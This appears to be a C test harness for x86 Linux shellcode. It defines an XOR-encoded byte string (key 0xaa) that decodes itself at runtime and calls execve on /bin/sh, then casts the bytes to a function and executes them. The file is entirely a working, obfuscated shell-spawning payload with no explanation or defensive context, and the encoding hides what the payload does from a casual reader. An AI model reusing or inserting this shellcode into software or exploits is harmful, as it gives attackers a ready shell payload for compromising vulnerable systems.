#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
